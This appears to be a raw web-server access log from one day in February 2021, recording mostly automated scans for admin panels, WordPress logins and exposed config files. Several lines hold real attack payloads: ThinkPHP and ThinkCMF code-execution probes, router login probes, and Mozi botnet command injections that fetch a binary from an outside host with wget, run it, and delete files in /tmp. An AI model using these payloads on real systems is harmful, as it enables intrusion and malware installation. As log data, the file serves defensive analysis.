45.155.205.108 - - [04/Feb/2021:09:08:53 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [04/Feb/2021:09:08:54 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [04/Feb/2021:09:08:54 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 1580 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [04/Feb/2021:09:08:54 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 1580 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [04/Feb/2021:09:08:54 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1580 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [04/Feb/2021:09:08:54 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [04/Feb/2021:09:08:54 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [04/Feb/2021:09:08:54 +0000] "GET /console/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [04/Feb/2021:09:08:54 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.118.53.202 - - [04/Feb/2021:09:36:59 +0000] "GET / HTTP/1.1" 200 1561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
209.141.51.62 - - [04/Feb/2021:09:40:26 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
171.33.248.213 - - [04/Feb/2021:10:02:01 +0000] "GET / HTTP/1.1" 200 3392 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
209.141.51.62 - - [04/Feb/2021:10:02:34 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
162.142.125.53 - - [04/Feb/2021:10:07:26 +0000] "GET / HTTP/1.1" 200 3392 "-" "-"
162.142.125.53 - - [04/Feb/2021:10:07:27 +0000] "GET / HTTP/1.1" 200 1561 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.141.51.62 - - [04/Feb/2021:10:17:45 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:10:25:29 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
205.185.115.133 - - [04/Feb/2021:10:29:14 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
198.20.96.10 - - [04/Feb/2021:10:31:33 +0000] "GET / HTTP/1.1" 200 1561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.241.224.37 - - [04/Feb/2021:10:40:07 +0000] "GET /hudson HTTP/1.1" 404 535 "-" "Mozilla/5.0 zgrab/0.x"
209.141.51.62 - - [04/Feb/2021:10:42:21 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:11:13:58 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
192.241.223.135 - - [04/Feb/2021:11:17:04 +0000] "GET /hudson HTTP/1.1" 404 535 "-" "Mozilla/5.0 zgrab/0.x"
205.185.115.133 - - [04/Feb/2021:11:31:10 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
128.14.134.134 - - [04/Feb/2021:11:40:55 +0000] "GET / HTTP/1.1" 200 1561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
113.11.133.178 - - [04/Feb/2021:11:45:13 +0000] "GET / HTTP/1.1" 200 3392 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
209.141.51.62 - - [04/Feb/2021:11:47:40 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
74.82.47.4 - - [04/Feb/2021:11:53:09 +0000] "GET / HTTP/1.1" 200 3392 "-" "-"
188.165.239.119 - - [04/Feb/2021:11:58:18 +0000] "POST /wp-login.php?redirect_to=http://www.iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
188.165.239.119 - - [04/Feb/2021:11:58:54 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
209.141.51.62 - - [04/Feb/2021:12:02:25 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
125.123.73.155 - - [04/Feb/2021:12:04:18 +0000] "GET /login HTTP/1.0" 404 554 "-" "-"
125.123.73.155 - - [04/Feb/2021:12:04:19 +0000] "GET /jenkins/login HTTP/1.0" 404 554 "-" "-"
125.123.73.155 - - [04/Feb/2021:12:04:19 +0000] "GET /manager/html HTTP/1.0" 404 554 "-" "-"
205.185.115.133 - - [04/Feb/2021:12:06:00 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
220.200.167.51 - - [04/Feb/2021:12:11:22 +0000] "HEAD http://110.242.68.4/ HTTP/1.1" 200 184 "-" "Mozilla/5.01719037 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
106.45.8.253 - - [04/Feb/2021:12:11:24 +0000] "GET http://www.rfa.org/english/ HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
220.200.163.187 - - [04/Feb/2021:12:11:24 +0000] "CONNECT www.so.com:443 HTTP/1.1" 200 3392 "-" "PycURL/7.43.0 libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3"
220.200.163.187 - - [04/Feb/2021:12:11:24 +0000] "\x16\x03\x01" 400 0 "-" "-"
121.237.168.163 - - [04/Feb/2021:12:11:25 +0000] "GET http://www.minghui.org/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
113.58.237.102 - - [04/Feb/2021:12:11:26 +0000] "GET http://dongtaiwang.com/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
175.184.165.82 - - [04/Feb/2021:12:11:26 +0000] "GET http://www.epochtimes.com/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
124.235.138.254 - - [04/Feb/2021:12:11:27 +0000] "GET http://www.soso.com/ HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
222.94.163.105 - - [04/Feb/2021:12:11:28 +0000] "CONNECT cn.bing.com:443 HTTP/1.1" 200 3392 "-" "PycURL/7.43.0 libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3"
121.237.168.103 - - [04/Feb/2021:12:11:28 +0000] "CONNECT www.voanews.com:443 HTTP/1.1" 200 0 "-" "PycURL/7.43.0 libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3"
111.175.57.51 - - [04/Feb/2021:12:11:30 +0000] "GET http://www.wujieliulan.com/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
59.173.154.174 - - [04/Feb/2021:12:11:31 +0000] "CONNECT www.baidu.com:443 HTTP/1.1" 200 3392 "-" "PycURL/7.43.0 libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3"
59.173.154.174 - - [04/Feb/2021:12:11:33 +0000] "\x16\x03\x01" 400 0 "-" "-"
13.66.139.143 - - [04/Feb/2021:12:12:02 +0000] "GET / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
209.141.51.62 - - [04/Feb/2021:12:14:20 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
5.39.64.29 - - [04/Feb/2021:12:22:10 +0000] "POST /wp-login.php?redirect_to=http://iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
5.39.64.46 - - [04/Feb/2021:12:22:18 +0000] "POST /wp-login.php?redirect_to=http://www.iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
5.39.64.29 - - [04/Feb/2021:12:22:30 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
5.39.64.46 - - [04/Feb/2021:12:22:50 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
5.39.64.29 - - [04/Feb/2021:12:24:20 +0000] "POST /wp-login.php?redirect_to=http://iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
5.39.64.29 - - [04/Feb/2021:12:24:29 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
205.185.115.133 - - [04/Feb/2021:12:26:11 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
205.185.116.48 - - [04/Feb/2021:12:27:47 +0000] "GET / HTTP/1.1" 200 1580 "-" "Mozilla/5.0 (compatible, MSIE 10.0, Windows NT, DigExt)"
209.141.51.62 - - [04/Feb/2021:12:30:02 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
205.185.121.3 - - [04/Feb/2021:12:33:50 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
5.39.64.29 - - [04/Feb/2021:12:38:21 +0000] "POST /wp-login.php?redirect_to=http://iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
5.39.64.29 - - [04/Feb/2021:12:38:40 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
205.185.124.237 - - [04/Feb/2021:12:40:06 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
205.185.116.208 - - [04/Feb/2021:12:49:10 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
164.52.24.163 - - [04/Feb/2021:12:50:21 +0000] "\x16\x03\x01\x01\"\x01" 400 0 "-" "-"
164.52.24.163 - - [04/Feb/2021:12:50:22 +0000] "\x16\x03\x01\x01\"\x01" 400 0 "-" "-"
164.52.24.163 - - [04/Feb/2021:12:50:22 +0000] "\x16\x03\x01" 400 0 "-" "-"
164.52.24.163 - - [04/Feb/2021:12:50:23 +0000] "\x16\x03\x01" 400 0 "-" "-"
164.52.24.163 - - [04/Feb/2021:12:50:23 +0000] "GET / HTTP/1.1" 200 3392 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
200.8.57.117 - - [04/Feb/2021:12:51:52 +0000] "GET /login HTTP/1.0" 404 554 "-" "-"
200.8.57.117 - - [04/Feb/2021:12:51:52 +0000] "GET /jenkins/login HTTP/1.0" 404 554 "-" "-"
200.8.57.117 - - [04/Feb/2021:12:51:52 +0000] "GET /manager/html HTTP/1.0" 404 554 "-" "-"
205.185.124.237 - - [04/Feb/2021:13:21:29 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
205.185.116.208 - - [04/Feb/2021:13:24:00 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
116.75.212.129 - - [04/Feb/2021:13:38:14 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 591 "-" "Hello, World"
186.233.180.145 - - [04/Feb/2021:13:44:11 +0000] "GET / HTTP/1.1" 200 3392 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
205.185.124.237 - - [04/Feb/2021:13:50:39 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
205.185.116.208 - - [04/Feb/2021:14:05:08 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
205.185.115.133 - - [04/Feb/2021:14:05:11 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
83.97.20.21 - - [04/Feb/2021:14:22:52 +0000] "GET / HTTP/1.0" 200 3411 "-" "-"
182.124.27.214 - - [04/Feb/2021:14:39:23 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 0 "-" "-"
185.224.129.247 - - [04/Feb/2021:15:00:53 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 554 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
178.128.194.144 - - [04/Feb/2021:15:19:29 +0000] "GET /login.asp HTTP/1.1" 404 535 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15"
128.14.134.134 - - [04/Feb/2021:15:31:44 +0000] "GET / HTTP/1.1" 200 1561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
51.89.204.21 - - [04/Feb/2021:15:40:51 +0000] "GET /.env HTTP/1.1" 404 591 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.89.204.21 - - [04/Feb/2021:15:40:51 +0000] "POST / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.185.124.237 - - [04/Feb/2021:15:47:47 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
205.185.116.208 - - [04/Feb/2021:15:55:48 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
213.55.77.143 - - [04/Feb/2021:16:10:40 +0000] "GET /login HTTP/1.0" 404 554 "-" "-"
213.55.77.143 - - [04/Feb/2021:16:10:41 +0000] "GET /jenkins/login HTTP/1.0" 404 554 "-" "-"
213.55.77.143 - - [04/Feb/2021:16:10:41 +0000] "GET /manager/html HTTP/1.0" 404 554 "-" "-"
85.105.233.85 - - [04/Feb/2021:16:11:01 +0000] "GET / HTTP/1.0" 200 3411 "-" "-"
192.241.201.57 - - [04/Feb/2021:16:15:10 +0000] "\n" 400 0 "-" "-"
207.46.13.166 - - [04/Feb/2021:16:24:15 +0000] "GET /robots.txt HTTP/1.1" 200 282 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
13.66.139.143 - - [04/Feb/2021:16:24:36 +0000] "GET / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
138.36.20.102 - - [04/Feb/2021:16:33:12 +0000] "GET / HTTP/1.1" 200 3392 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
74.120.14.40 - - [04/Feb/2021:16:33:24 +0000] "\x16\x03\x01" 400 0 "-" "-"
74.120.14.40 - - [04/Feb/2021:16:33:25 +0000] "GET / HTTP/1.1" 200 3392 "-" "-"
74.120.14.40 - - [04/Feb/2021:16:33:25 +0000] "GET / HTTP/1.1" 200 1561 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
205.185.116.208 - - [04/Feb/2021:16:37:31 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
205.185.124.237 - - [04/Feb/2021:16:39:17 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
46.105.100.82 - - [04/Feb/2021:16:44:05 +0000] "POST /wp-login.php?redirect_to=http://iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
46.105.100.82 - - [04/Feb/2021:16:44:44 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
162.142.125.54 - - [04/Feb/2021:16:56:41 +0000] "GET / HTTP/1.1" 200 3392 "-" "-"
162.142.125.54 - - [04/Feb/2021:16:56:41 +0000] "GET / HTTP/1.1" 200 1561 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
205.185.115.133 - - [04/Feb/2021:16:57:43 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
205.185.116.208 - - [04/Feb/2021:17:02:38 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
205.185.124.237 - - [04/Feb/2021:17:13:48 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
85.105.143.150 - - [04/Feb/2021:17:33:13 +0000] "GET / HTTP/1.1" 200 3392 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (Linux; Android 9; G8141) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (Linux; Android 9; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /phpmyadmin HTTP/1.1" 404 591 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.158 Safari/537.36 Vivaldi/2.5.1525.43"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Linux; Android 9; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 591 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:24.0) Gecko/20100101 Firefox/24.0 SeaMonkey/2.21"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /pma HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/80.0.180 Chrome/74.0.3729.180 Safari/537.36"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /pma/ HTTP/1.1" 404 591 "-" "Mozilla/5.0 (MeeGo; NokiaN950-00/00) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /pma/index.php HTTP/1.1" 404 591 "-" "Opera/7.50 (Windows XP; U)"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /pmadmin HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /pmadmin/ HTTP/1.1" 404 591 "-" "Uzbl (Webkit 1.3) (Linux i686 [i686])"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /pmadmin/index.php HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /pma.php HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Linux; Android 7.1.2; Pixel Build/NHG47N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /admin.php HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG-SM-G930A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /admin HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /admin/ HTTP/1.1" 404 591 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.72"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /admin/pma.php HTTP/1.1" 404 591 "-" "Mozilla/5.0 (iPad; CPU OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Flipboard/4.2.48"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET /admin/index.php HTTP/1.1" 404 591 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1"
89.248.165.7 - - [04/Feb/2021:17:36:33 +0000] "GET / HTTP/1.1" 200 1617 "-" "Mozilla/5.0 (Linux; Android 9; Mi A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
167.248.133.39 - - [04/Feb/2021:17:40:49 +0000] "\x16\x03\x01" 400 0 "-" "-"
167.248.133.39 - - [04/Feb/2021:17:40:50 +0000] "GET / HTTP/1.1" 200 3392 "-" "-"
167.248.133.39 - - [04/Feb/2021:17:40:51 +0000] "GET / HTTP/1.1" 200 1561 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
103.217.121.226 - - [04/Feb/2021:17:45:03 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://103.217.121.226:41633/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 591 "-" "Hello, world"
205.185.124.237 - - [04/Feb/2021:17:45:56 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
37.187.74.109 - - [04/Feb/2021:17:47:08 +0000] "POST /wp-login.php?redirect_to=http://www.iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
37.187.74.109 - - [04/Feb/2021:17:49:15 +0000] "POST /wp-login.php?redirect_to=http://www.iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
37.187.74.109 - - [04/Feb/2021:17:50:15 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
37.59.54.36 - - [04/Feb/2021:17:50:23 +0000] "POST /wp-login.php?redirect_to=http://www.iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
37.59.54.36 - - [04/Feb/2021:17:51:01 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
37.59.54.36 - - [04/Feb/2021:17:53:16 +0000] "POST /wp-login.php?redirect_to=http://www.iquent.eu/wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
37.59.54.36 - - [04/Feb/2021:17:53:48 +0000] "GET /wp-admin/ HTTP/1.1" 404 554 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"
103.89.254.238 - - [04/Feb/2021:17:55:34 +0000] "GET / HTTP/1.1" 200 3392 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
205.185.116.208 - - [04/Feb/2021:18:07:05 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
62.211.232.85 - - [04/Feb/2021:18:18:36 +0000] "GET / HTTP/1.1" 200 3392 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
193.118.53.202 - - [04/Feb/2021:19:12:41 +0000] "GET / HTTP/1.1" 200 1561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
103.99.3.216 - - [04/Feb/2021:19:20:34 +0000] "GET / HTTP/1.1" 200 1561 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
205.185.116.208 - - [04/Feb/2021:19:25:04 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
192.241.224.121 - - [04/Feb/2021:19:29:17 +0000] "GET / HTTP/1.1" 200 1561 "-" "Mozilla/5.0 zgrab/0.x"
205.185.115.133 - - [04/Feb/2021:19:33:24 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
205.185.124.237 - - [04/Feb/2021:19:35:00 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
185.224.129.247 - - [04/Feb/2021:20:08:04 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 554 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
205.185.116.208 - - [04/Feb/2021:20:13:08 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
205.185.124.237 - - [04/Feb/2021:20:17:13 +0000] "GET /script HTTP/1.1\n" 400 0 "-" "-"
209.141.51.62 - - [04/Feb/2021:20:38:40 +0000] "GET /manager/html HTTP/1.1\n" 400 0 "-" "-"
39.79.150.129 - - [04/Feb/2021:20:45:12 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 554 "-" "-"
